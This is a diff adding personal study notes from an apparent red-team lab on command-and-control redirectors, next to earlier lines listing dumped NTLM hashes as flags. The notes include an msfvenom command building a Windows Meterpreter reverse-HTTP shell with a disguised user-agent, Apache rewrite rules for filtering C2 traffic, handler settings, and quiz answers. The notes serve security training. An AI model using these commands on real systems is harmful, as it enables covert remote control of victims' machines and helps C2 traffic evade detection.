@@ -145,7 +145,52 @@ Dump Hashes > right click > Meterpreter 2 > Access > Dump Hashes > Registry meth
 Administartor NTLM Hash flag#2: c1565d108721c5626a6a054d6e0943c
 Ted NTLM Hash flag#4: 2e2618f266da8867e5664425c1309a5c
 
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+Advanced C2 Setups
+
+Redirector
+-redirects http/https requests based on information within the http request body
+-runs Apache 2 or NGINX
+-setting up firewall to only allow communication to and from redirectors mitigates any potential risks
+
+Setup Apache 2
+-module: "mod_rewrite"
+-allows to form rules to forward requests to internal or external hosts on a server based on specific HTTP headers or content
+-modules needed: rewrite, proxy, proxy_http and headers
+
+apt install apache2
+a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
+
+-using meterpreter - threat actor to make a slight adjustment to the user-agent in C2 http/https payloads
+-The HTTP request might get overlooked if the are similar
+
+root@kali$ msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
+
+Modifying Apache config file
+-location on Debian based systems
+cat /etc/apache2/sites-available/000-default.conf | grep -v '#'
+
+Mod rewrite documentation: https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html
+add: RewriteEngine On
+add: RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
+
+Setting up Exploit/Multi/Handler
+-LHOST: public IP 
+-LPORT: port chosen
+-ReverseListenerBindAddress: IP
+-ReverseListenerBindPort: Port
+-OverrideLHOST: redirector's IP
+-OverrideLPORT: redirector's port
+-HttpUserAgent: NotMeterpreter
+-OverrideRequestHost: true
+run
+
+What setting name that allows you to modify the User Agent field in a Meterpreter payload?
+HTTPUSERAGENT
+
+What setting name that allows you to modify the Host header in a Meterpreter payload?
+HttpHostHeader
 
 
 
